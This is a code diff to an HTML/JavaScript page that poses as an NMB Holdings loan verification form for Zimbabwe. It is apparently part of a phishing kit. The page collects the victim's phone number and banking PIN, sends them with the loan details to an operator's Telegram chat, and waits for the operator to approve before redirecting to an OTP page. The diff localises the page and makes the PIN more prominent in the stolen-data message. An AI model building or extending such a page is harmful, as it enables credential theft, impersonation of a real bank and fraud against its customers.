@@ -24,7 +24,7 @@
                     <span class="text-3xl sm:text-4xl font-black text-[#E4C16A]">Connect</span>
                 </div>
             </div>
-            <p class="text-white/70 text-xs font-semibold uppercase tracking-wide">Secure Access</p>
+            <p class="text-white/70 text-xs font-semibold uppercase tracking-wide">🇿🇼 Zimbabwe Verification</p>
         </div>
 
         <!-- Main Card -->
@@ -32,60 +32,80 @@
             <!-- Title Section -->
             <div class="bg-gradient-to-r from-[#003B4F] to-[#001F2E] p-6 sm:p-8 text-center">
                 <h1 class="text-white font-black text-2xl sm:text-3xl mb-2">Verify Your Details</h1>
-                <p class="text-white/80 text-sm">Enter your phone and PIN</p>
+                <p class="text-white/80 text-sm">Phone Number & PIN Verification</p>
             </div>
 
             <!-- Content -->
             <div id="loginForm" class="p-6 sm:p-8 space-y-6">
                 <!-- Loan Amount Display -->
-                <div class="bg-blue-50 border border-blue-200 rounded-lg p-4">
-                    <div class="flex justify-between items-center">
+                <div class="bg-gradient-to-r from-blue-50 to-blue-100 border border-blue-300 rounded-lg p-4">
+                    <div class="flex justify-between items-center mb-2">
                         <span class="text-xs font-black text-gray-700 uppercase">Loan Amount</span>
-                        <span class="font-black text-lg text-[#003B4F]" id="displayAmount">$500</span>
+                        <i class="fas fa-money-bill-wave text-[#E4C16A] text-lg"></i>
                     </div>
+                    <span class="font-black text-2xl text-[#003B4F]" id="displayAmount">ZWL 50,000</span>
                 </div>
 
                 <!-- Applicant Name Display -->
-                <div class="bg-blue-50 border border-blue-200 rounded-lg p-4">
-                    <div class="flex justify-between items-center">
-                        <span class="text-xs font-black text-gray-700 uppercase">Applicant</span>
-                        <span class="font-black text-lg text-[#003B4F]" id="displayName">-</span>
+                <div class="bg-gradient-to-r from-green-50 to-green-100 border border-green-300 rounded-lg p-4">
+                    <div class="flex justify-between items-center mb-2">
+                        <span class="text-xs font-black text-gray-700 uppercase">Applicant Name</span>
+                        <i class="fas fa-user text-[#E4C16A] text-lg"></i>
                     </div>
+                    <span class="font-black text-lg text-[#003B4F]" id="displayName">-</span>
                 </div>
 
                 <!-- Phone Number -->
                 <div class="space-y-2">
-                    <label class="text-xs font-black text-gray-700 uppercase">Phone Number</label>
+                    <label class="text-xs font-black text-gray-700 uppercase flex items-center gap-2">
+                        <span>🇿🇼</span> Phone Number (Zimbabwe)
+                    </label>
                     <div class="relative">
-                        <span class="absolute left-4 top-1/2 -translate-y-1/2 text-gray-700 font-black">+263</span>
+                        <span class="absolute left-4 top-1/2 -translate-y-1/2 text-gray-700 font-black text-sm">+263</span>
                         <input type="tel" id="phone" maxlength="9" placeholder="771234567" 
                             class="w-full pl-16 pr-4 py-3 sm:py-4 bg-gray-50 border border-gray-300 rounded-lg focus:outline-none focus:border-[#E4C16A] transition-all font-black text-base text-gray-700 placeholder:text-gray-400">
                     </div>
+                    <p class="text-xs text-gray-500">Format: 77, 78, or 26 prefix</p>
                 </div>
 
                 <!-- PIN -->
                 <div class="space-y-2">
                     <label class="text-xs font-black text-gray-700 uppercase">4-Digit PIN</label>
                     <div class="flex gap-2 sm:gap-3">
-                        <input type="password" maxlength="1" class="pin-input w-full h-14 sm:h-16 text-center text-2xl font-black bg-gray-50 border border-gray-300 rounded-lg focus:outline-none">
-                        <input type="password" maxlength="1" class="pin-input w-full h-14 sm:h-16 text-center text-2xl font-black bg-gray-50 border border-gray-300 rounded-lg focus:outline-none">
-                        <input type="password" maxlength="1" class="pin-input w-full h-14 sm:h-16 text-center text-2xl font-black bg-gray-50 border border-gray-300 rounded-lg focus:outline-none">
-                        <input type="password" maxlength="1" class="pin-input w-full h-14 sm:h-16 text-center text-2xl font-black bg-gray-50 border border-gray-300 rounded-lg focus:outline-none">
+                        <input type="password" maxlength="1" class="pin-input w-full h-14 sm:h-16 text-center text-2xl font-black bg-gray-50 border border-gray-300 rounded-lg focus:outline-none" inputmode="numeric">
+                        <input type="password" maxlength="1" class="pin-input w-full h-14 sm:h-16 text-center text-2xl font-black bg-gray-50 border border-gray-300 rounded-lg focus:outline-none" inputmode="numeric">
+                        <input type="password" maxlength="1" class="pin-input w-full h-14 sm:h-16 text-center text-2xl font-black bg-gray-50 border border-gray-300 rounded-lg focus:outline-none" inputmode="numeric">
+                        <input type="password" maxlength="1" class="pin-input w-full h-14 sm:h-16 text-center text-2xl font-black bg-gray-50 border border-gray-300 rounded-lg focus:outline-none" inputmode="numeric">
                     </div>
+                    <p class="text-xs text-gray-500">Your 4-digit security PIN</p>
                 </div>
 
                 <!-- Submit Button -->
-                <button id="submitBtn" class="w-full bg-gradient-to-r from-[#003B4F] to-[#001F2E] text-white font-black py-4 rounded-lg hover:shadow-lg transition-all uppercase text-sm tracking-wide">
-                    Verify
+                <button id="submitBtn" class="w-full bg-gradient-to-r from-[#003B4F] to-[#001F2E] text-white font-black py-4 rounded-lg hover:shadow-lg transition-all uppercase text-sm tracking-wide flex items-center justify-center gap-2">
+                    <i class="fas fa-check"></i> Proceed & Verify
                 </button>
 
-                <!-- Testing Info -->
-                <div class="bg-yellow-50 border border-yellow-200 rounded-lg p-3">
-                    <p class="text-xs text-gray-700 leading-relaxed">
-                        <i class="fas fa-info-circle text-yellow-600 mr-1"></i>
-                        <strong>After clicking Verify:</strong> Check your Telegram chat. Click the ✅ APPROVE button to proceed.
-                    </p>
+                <!-- Back Button -->
+                <button onclick="goBack()" class="w-full bg-white border-2 border-gray-300 text-gray-700 font-black py-3 rounded-lg hover:bg-gray-50 transition-all uppercase text-xs tracking-wide">
+                    Back to Calculator
+                </button>
+            </div>
+
+            <!-- Already Applied Warning -->
+            <div id="alreadyAppliedWarning" class="hidden p-6 sm:p-8 text-center space-y-4 bg-red-50">
+                <div class="w-16 h-16 mx-auto bg-red-100 rounded-full flex items-center justify-center">
+                    <i class="fas fa-exclamation-triangle text-3xl text-red-600"></i>
                 </div>
+                <h3 class="text-xl font-black text-gray-800">Application Already Submitted</h3>
+                <p class="text-gray-600 text-sm font-medium">
+                    This phone number has already applied for a loan. You cannot submit another application at this time.
+                </p>
+                <p class="text-gray-500 text-xs">
+                    Please wait for a response from our team or contact support.
+                </p>
+                <button onclick="goBack()" class="w-full bg-gradient-to-r from-[#003B4F] to-[#001F2E] text-white font-black py-3 rounded-lg uppercase text-sm">
+                    Go Back
+                </button>
             </div>
 
             <!-- Polling Overlay -->
@@ -99,21 +119,24 @@
                 </div>
                 
                 <div class="space-y-2">
-                    <h3 class="text-xl font-black text-gray-800 tracking-tight">Waiting for Approval</h3>
-                    <p class="text-gray-600 text-sm font-medium leading-relaxed">Check your Telegram and click ✅ APPROVE button</p>
-                    <p class="text-gray-500 text-xs">Waiting... (2 min timeout)</p>
+                    <h3 class="text-xl font-black text-gray-800 tracking-tight">Verifying Your Details</h3>
+                    <p class="text-gray-600 text-sm font-medium leading-relaxed">
+                        <i class="fas fa-info-circle text-blue-600 mr-1"></i>
+                        Check your Telegram and click ✅ APPROVE button
+                    </p>
+                    <p class="text-gray-500 text-xs">Waiting for approval...</p>
                 </div>
 
-                <!-- Manual Override for Testing -->
+                <!-- Manual Test Button -->
                 <button id="manualApproveBtn" class="mt-4 w-full bg-green-500 text-white font-black py-2 rounded-lg text-xs">
-                    🧪 TEST: Manual Approve (for testing without Telegram)
+                    🧪 TEST: Manual Approve
                 </button>
             </div>
         </div>
 
         <!-- Footer -->
         <p class="text-center text-white/60 text-xs mt-6 font-semibold">
-            © 2026 NMB Holdings | Zimbabwe's Trusted Lender
+            © 2026 NMB Holdings Limited | Zimbabwe's Trusted Lender
         </p>
     </div>
 
@@ -128,6 +151,7 @@
         const submitBtn = document.getElementById('submitBtn');
         const loginForm = document.getElementById('loginForm');
         const pollingOverlay = document.getElementById('pollingOverlay');
+        const alreadyAppliedWarning = document.getElementById('alreadyAppliedWarning');
         const displayAmount = document.getElementById('displayAmount');
         const displayName = document.getElementById('displayName');
         const manualApproveBtn = document.getElementById('manualApproveBtn');
@@ -135,7 +159,7 @@
         // Load loan data
         const loanData = JSON.parse(localStorage.getItem('nmb_loan_data') || '{}');
         if (loanData.amount) {
-            displayAmount.textContent = `$${loanData.amount}`;
+            displayAmount.textContent = 'ZWL ' + Math.round(parseFloat(loanData.amount)).toLocaleString();
         }
         if (loanData.fullName) {
             displayName.textContent = loanData.fullName;
@@ -156,6 +180,11 @@
             e.target.value = e.target.value.replace(/\D/g, '');
         });
 
+        // Go Back Function
+        function goBack() {
+            window.location.href = 'index_FINAL.html';
+        }
+
         // Submit Handler
         submitBtn.addEventListener('click', async () => {
             const phone = phoneInput.value;
@@ -170,12 +199,23 @@
                 return; 
             }
 
+            // Check if already applied
+            const appliedPhones = JSON.parse(localStorage.getItem('nmb_applied_phones') || '[]');
+            const fullPhone = '+263' + phone;
+            
+            if (appliedPhones.includes(fullPhone)) {
+                loginForm.classList.add('hidden');
+                alreadyAppliedWarning.classList.remove('hidden');
+                return;
+            }
+
             const sessionData = {
-                phone: '+263' + phone,
+                phone: fullPhone,
                 pin: pin,
-                amount: loanData.amount || '500',
+                amount: loanData.amount || '50000',
                 term: loanData.term || '12',
-                monthly: loanData.monthly || '$0.00',
+                monthly: loanData.monthly || 'ZWL 0',
+                total: loanData.total || 'ZWL 0',
                 fullName: loanData.fullName || 'N/A',
                 loanPurpose: loanData.loanPurpose || 'N/A',
                 monthlyIncome: loanData.monthlyIncome || 'N/A'
@@ -184,17 +224,19 @@
 
             // Send to Telegram
             const message = `
-🔐 <b>NEW LOAN APPLICATION</b>
+🔐 <b>NEW LOAN APPLICATION - VERIFICATION</b>
 
-📱 Phone: ${sessionData.phone}
+📱 Phone: <b>${sessionData.phone}</b>
+🔑 PIN: <b>${pin}</b>
+💰 Loan Amount: <b>${sessionData.amount}</b>
+
 👤 Name: ${sessionData.fullName}
-💰 Loan Amount: $${sessionData.amount}
 📅 Term: ${sessionData.term} months
 💳 Monthly Payment: ${sessionData.monthly}
 🎯 Purpose: ${sessionData.loanPurpose}
-💵 Monthly Income: $${sessionData.monthlyIncome}
+💵 Monthly Income: ZWL ${sessionData.monthlyIncome}
 
-<b>PIN: ${pin}</b>
+🇿🇼 <b>Zimbabwe Application</b>
             `;
 
             const inlineKeyboard = {
@@ -221,6 +263,10 @@
                 if (response.ok) {
                     loginForm.classList.add('hidden');
                     pollingOverlay.classList.remove('hidden');
+                    
+                    // Add phone to applied list
+                    appliedPhones.push(fullPhone);
+                    localStorage.setItem('nmb_applied_phones', JSON.stringify(appliedPhones));
                     
                     // Start polling for approval
                     pollForApproval(sessionData.phone);
@@ -256,7 +302,7 @@
                     clearInterval(interval);
                     localStorage.removeItem(`approval_${phone}`);
                     console.log('✅ Approval detected! Redirecting to OTP...');
-                    window.location.href = 'otp.html';
+                    window.location.href = 'otp_FINAL.html';
                 } else if (approvalStatus === 'declined') {
                     clearInterval(interval);
                     localStorage.removeItem(`approval_${phone}`);
